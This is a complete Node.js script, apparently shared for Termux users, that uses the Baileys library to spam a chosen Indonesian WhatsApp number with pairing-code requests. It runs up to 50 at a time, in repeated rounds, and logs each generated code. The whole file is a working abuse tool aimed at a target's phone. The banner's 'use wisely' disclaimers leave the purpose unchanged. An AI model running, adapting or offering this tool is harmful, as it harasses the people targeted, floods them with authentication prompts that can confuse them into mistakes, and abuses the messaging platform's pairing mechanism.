const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");

// DRAVIN Style ANSI Colors
const dravin = {
    reset: "\x1b[0m",
    red: "\x1b[31m",
    green: "\x1b[32m",
    yellow: "\x1b[33m",
    blue: "\x1b[34m",
    magenta: "\x1b[35m",
    cyan: "\x1b[36m",
    white: "\x1b[37m",
    bold: "\x1b[1m",
    underline: "\x1b[4m"
};

// DRAVIN Banner
const showDravinBanner = () => {
    console.clear();
    console.log(`${dravin.magenta}${dravin.bold}
    ██████╗ ██████╗  █████╗ ██╗   ██╗██╗███╗   ██╗
    ██╔══██╗██╔══██╗██╔══██╗██║   ██║██║████╗  ██║
    ██║  ██║██████╔╝███████║██║   ██║██║██╔██╗ ██║
    ██║  ██║██╔══██╗██╔══██║╚██╗ ██╔╝██║██║╚██╗██║
    ██████╔╝██║  ██║██║  ██║ ╚████╔╝ ██║██║ ╚████║
    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚═╝  ╚═══╝
    ${dravin.reset}`);
    
    console.log(`${dravin.cyan}╔══════════════════════════════════════════════════╗`);
    console.log(`║ ${dravin.white}${dravin.bold}WA PAIRING SPAM TOOLS - BY DRAVIN${dravin.reset}${dravin.cyan}          ║`);
    console.log(`║ ${dravin.white}${dravin.bold}FOR TERMUX • NO BOT • SIMPLE BUT POWERFUL${dravin.cyan}     ║`);
    console.log(`╚══════════════════════════════════════════════════╝${dravin.reset}`);
    
    console.log(`${dravin.yellow}${dravin.bold}NOTE:${dravin.reset}`);
    console.log(`${dravin.yellow}• Gunakan dengan bijak`);
    console.log(`• Hanya untuk nomor Indonesia (62)`);
    console.log(`• Jangan disalahgunakan${dravin.reset}\n`);
};

const question = (text) => {
    const rl = readline.createInterface({ 
        input: process.stdin, 
        output: process.stdout 
    });
    return new Promise((resolve) => { 
        rl.question(text, resolve) 
    });
};

async function initConnection() {
    const { state } = await useMultiFileAuthState('./dravin_session');
    return makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        browser: ["DRAVIN-TOOLS", "Chrome", "1.0"],
        syncFullHistory: false,
        markOnlineOnConnect: false
    });
}

async function startPairingSpam() {
    const conn = await initConnection();
    
    while (true) {
        console.log(`\n${dravin.blue}╔════════════════════════════════════════╗`);
        console.log(`║ ${dravin.white}MASUKKAN DETAIL TARGET${dravin.blue}               ║`);
        console.log(`╚════════════════════════════════════════╝${dravin.reset}`);
        
        const phoneNumber = await question(`${dravin.cyan}[?] Nomor Target (62xxxxxxx): ${dravin.reset}`);
        
        if (!phoneNumber.startsWith('62')) {
            console.log(`${dravin.red}[!] Harus dimulai dengan 62${dravin.reset}`);
            continue;
        }

        const spamCount = parseInt(await question(`${dravin.cyan}[?] Jumlah Spam (1-50): ${dravin.reset}`));
        if (isNaN(spamCount) || spamCount < 1 || spamCount > 50) {
            console.log(`${dravin.red}[!] Masukkan angka 1-50${dravin.reset}`);
            continue;
        }

        console.log(`\n${dravin.green}${dravin.bold}[+] MEMULAI SPAM KE ${phoneNumber}${dravin.reset}`);
        
        let success = 0;
        for (let i = 0; i < spamCount; i++) {
            try {
                const startTime = Date.now();
                let code = await conn.requestPairingCode(phoneNumber);
                code = code.match(/.{1,4}/g).join('-');
                const timeTaken = ((Date.now() - startTime)/1000).toFixed(2);
                
                success++;
                console.log(`${dravin.green}[✓] ${dravin.white}Berhasil ${i+1}/${spamCount}${dravin.reset}`);
                console.log(`${dravin.cyan}   ├─ Kode: ${dravin.yellow}${code}${dravin.reset}`);
                console.log(`${dravin.cyan}   └─ Waktu: ${dravin.green}${timeTaken}s${dravin.reset}`);
                
                await new Promise(resolve => setTimeout(resolve, 1000));
            } catch (error) {
                console.log(`${dravin.red}[X] Gagal ${i+1}/${spamCount}: ${error.message}${dravin.reset}`);
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }

        console.log(`\n${dravin.blue}${dravin.bold}[HASIL]${dravin.reset}`);
        console.log(`${dravin.cyan}├─ Nomor: ${dravin.yellow}${phoneNumber}${dravin.reset}`);
        console.log(`${dravin.cyan}├─ Total: ${dravin.white}${spamCount}${dravin.reset}`);
        console.log(`${dravin.cyan}├─ Berhasil: ${dravin.green}${success}${dravin.reset}`);
        console.log(`${dravin.cyan}└─ Gagal: ${dravin.red}${spamCount - success}${dravin.reset}`);

        const lanjut = await question(`\n${dravin.cyan}[?] Spam lagi? (y/n): ${dravin.reset}`);
        if (lanjut.toLowerCase() !== 'y') break;
    }
    
    console.log(`\n${dravin.green}${dravin.bold}[+] TERIMA KASIH TELAH MENGGUNAKAN TOOLS INI${dravin.reset}`);
    process.exit(0);
}

// Main Execution
showDravinBanner();
setTimeout(() => {
    console.log(`${dravin.yellow}[!] MEMPERSIAPKAN TOOLS...${dravin.reset}`);
    setTimeout(startPairingSpam, 1500);
}, 500);
